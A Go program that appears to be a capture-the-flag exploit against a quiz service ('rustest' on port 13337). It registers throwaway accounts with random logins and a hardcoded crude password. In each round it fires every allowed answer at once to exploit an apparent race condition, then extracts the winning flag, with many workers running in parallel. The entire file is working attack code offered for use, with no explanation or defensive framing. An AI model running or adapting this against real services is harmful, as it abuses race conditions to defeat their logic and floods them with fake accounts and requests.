package main

import (
	"bytes"
	"context"
	"crypto/rand"
	"crypto/tls"
	"encoding/base32"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"golang.org/x/net/http2"
	"io"
	"log"
	"net"
	"net/http"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

type registerReq struct {
	Login    string `json:"login"`
	Password string `json:"password"`
}

type registerResp struct {
	Token string `json:"token"`
}

var requestsTotal = atomic.Uint64{}

func prepareJsonRequest(url string, method string, req any, headers map[string]string, ctx context.Context) (*http.Request, error) {
	var body io.Reader = nil
	if req != nil {
		buf := &bytes.Buffer{}
		if err := json.NewEncoder(buf).Encode(req); err != nil {
			return nil, err
		}
		body = buf
	}

	r, err := http.NewRequestWithContext(ctx, method, url, body)
	if err != nil {
		return nil, err
	}

	r.Header.Set("Content-Type", "application/json")
	for headerName, headerVal := range headers {
		r.Header.Add(headerName, headerVal)
	}

	requestsTotal.Add(1)
	return r, nil
}

func getResp(ctx context.Context, client *http.Client, url string, method string, jsonReq any, jsonResp any, headers map[string]string) error {
	req, err := prepareJsonRequest(url, method, jsonReq, headers, ctx)
	if err != nil {
		return err
	}

	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("client cannot do request: %w", err)
	}
	defer resp.Body.Close()

	var buf bytes.Buffer
	_, _ = io.Copy(&buf, resp.Body)
	s := buf.String()

	if err := json.NewDecoder(&buf).Decode(jsonResp); err != nil {
		return fmt.Errorf("cannot parse json from response body `%s`: %w", s, err)
	}

	return nil
}

func register(ctx context.Context, client *http.Client, url string, login string, password string) (string, error) {
	var req = registerReq{Login: login, Password: password}
	var resp registerResp

	if err := getResp(ctx, client, fmt.Sprintf("%s/api/register", url), http.MethodPost, &req, &resp, nil); err != nil {
		return "", err
	}

	return resp.Token, nil
}

type submitReq struct {
	Answer uint64 `json:"answer"`
	Round  uint64 `json:"round"`
}

func submitResponse(ctx context.Context, client *http.Client, url string, testID string, round int, answer int, token string) (*testState, error) {
	reqBody := submitReq{
		Answer: uint64(answer),
		Round:  uint64(round),
	}

	req, err := prepareJsonRequest(
		fmt.Sprintf("%s/api/rustest/%s/submit", url, testID),
		http.MethodPost,
		&reqBody,
		map[string]string{"Authorization": fmt.Sprintf("Bearer %s", token)},
		ctx,
	)
	if err != nil {
		return nil, err
	}

	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("cannot submit response: %w", err)
	}
	defer resp.Body.Close()

	var buf bytes.Buffer
	_, err = io.Copy(&buf, resp.Body)
	if err != nil {
		return nil, err
	}

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("unsuccessful submit response code %d. body: %s", resp.StatusCode, buf.String())
	}

	var respBody testState
	if err := json.NewDecoder(&buf).Decode(&respBody); err != nil {
		return nil, fmt.Errorf("error occurred while subbmitting response: %s", buf.String())
	}

	return &respBody, nil
}

type question struct {
	Question       string   `json:"question"`
	AllowedAnswers []string `json:"allowed_answers"`
}

type finalState struct {
	Result string  `json:"result"`
	Reward *string `json:"reward"`
}

type testState struct {
	State      string      `json:"state"`
	Question   *question   `json:"question"`
	Round      *int        `json:"round"`
	FinalState *finalState `json:"final_state"`
}

func getTestState(ctx context.Context, client *http.Client, url string, testID string, token string) (*testState, error) {
	var resp testState
	err := getResp(
		ctx,
		client,
		fmt.Sprintf("%s/api/rustest/%s/solve", url, testID),
		http.MethodGet,
		nil,
		&resp,
		map[string]string{"Authorization": fmt.Sprintf("Bearer %s", token)},
	)
	if err != nil {
		return nil, err
	}

	return &resp, nil
}

func trySploitRound(ctx context.Context, client *http.Client, state testState, url string, token string, testID string) (maybeFlag string, success bool, nextState *testState, err error) {
	if state.State == "Final" {
		if state.FinalState.Result == "Lose" {
			return "", false, &state, fmt.Errorf("lose result, user %s", token)
		}

		return *state.FinalState.Reward, true, &state, nil
	}

	var wg sync.WaitGroup
	var roundErr error = nil
	var errOnce sync.Once

	answersNum := len(state.Question.AllowedAnswers)
	responses := make([]testState, answersNum)
	for answer := 0; answer < answersNum; answer++ {
		answer := answer
		wg.Add(1)

		go func() {
			defer wg.Done()

			resp, err := submitResponse(ctx, client, url, testID, *state.Round, answer, token)
			if err != nil {
				errOnce.Do(func() { roundErr = err })
				return
			}
			responses[answer] = *resp
		}()
	}

	wg.Wait()

	if roundErr != nil {
		return "", false, nil, fmt.Errorf("error occurred while trying to submit answers: %w", roundErr)
	}

	if responses[0].State == "Final" {
		// that was final question, other responses MUST contain win information
		for _, resp := range responses {
			if resp.State != "Final" {
				return "", false, nil, fmt.Errorf("inconsistent state, not all states are final for user %s", token)
			}

			if resp.FinalState.Result == "Win" {
				return *resp.FinalState.Reward, true, &resp, nil
			}
		}

		// all responses contain not win result
		return "", false, nil, fmt.Errorf("inconsistent state, all final states for user %s are Lose", token)
	}

	rnd := *responses[0].Round
	for _, resp := range responses {
		// all responses must contain equal rounds
		// if round wasn't specified, or round was present, but not equal to round of first response
		if resp.Round == nil || *resp.Round != rnd {
			return "", false, nil, fmt.Errorf("rounds after submits are differrent")
		}
	}

	return "", true, &responses[0], nil
}

func trySploitTest(ctx context.Context, client *http.Client, url string, testID string) (string, error) {
	loginData := make([]byte, 6)
	if _, err := rand.Read(loginData); err != nil {
		log.Panic(err)
	}
	login := base32.StdEncoding.EncodeToString(loginData)
	login = strings.Trim(login, "=")
	login = strings.ToLower(login)

	token, err := register(ctx, client, url, login, "penis228")
	if err != nil {
		return "", fmt.Errorf("cannot register user `%s`: %w", login, err)
	}

	curState, err := getTestState(ctx, client, url, testID, token)
	if err != nil {
		return "", fmt.Errorf("cannot get current curState of test: %w", err)
	}

	for {
		maybeFlag, success, nxtState, err := trySploitRound(ctx, client, *curState, url, token, testID)
		if !success {
			return "", fmt.Errorf("round sploit didn't succeed: %w", err)
		}

		if maybeFlag != "" {
			return maybeFlag, nil
		}

		curState = nxtState
	}
}

func concurrentSploit(client *http.Client, url string, testID string, workers uint) (string, uint64) {
	ctx, cancel := context.WithCancel(context.Background())
	var flagOnce sync.Once
	var testFlag string
	setFlag := func(f string) {
		testFlag = f
		cancel()
	}

	var attempts atomic.Uint64

	var wg sync.WaitGroup
	for i := uint(0); i < workers; i++ {
		wg.Add(1)

		go func() {
			defer wg.Done()

			for {
				attempts.Add(1)

				f, err := trySploitTest(ctx, client, url, testID)
				if err == nil {
					flagOnce.Do(func() { setFlag(f) })
					break
				}
				if !strings.Contains(err.Error(), "trying to send answer for round") && !errors.Is(err, context.Canceled) {
					fmt.Println(err)
				}

				select {
				case <-ctx.Done():
					return
				default:
					continue
				}
			}
		}()
	}

	wg.Wait()
	return testFlag, attempts.Load()
}

func makeClient() *http.Client {
	return &http.Client{
		Transport: &http2.Transport{
			AllowHTTP: true,
			DialTLSContext: func(ctx context.Context, network, addr string, cfg *tls.Config) (net.Conn, error) {
				var d net.Dialer
				return d.DialContext(ctx, network, addr)
			},
		},
	}
}

func main() {
	var (
		testID  string
		url     string
		workers uint
	)
	flag.UintVar(&workers, "workers", 8, "amount of concurrent workers")
	flag.Parse()
	hostname := flag.Arg(0)
	testID = flag.Arg(1)

	if testID == "" || hostname == "" {
		log.Panic("`test` and `url` vars are required")
	}

	url = fmt.Sprintf("http://%s:13337", hostname)

	client := makeClient()

	start := time.Now()
	f, attempts := concurrentSploit(client, url, testID, workers)
	dur := time.Since(start)

	fmt.Printf("%s\nattempts: %d\ntime: %s\nrequests: %d\n", f, attempts, dur.String(), requestsTotal.Load())
}
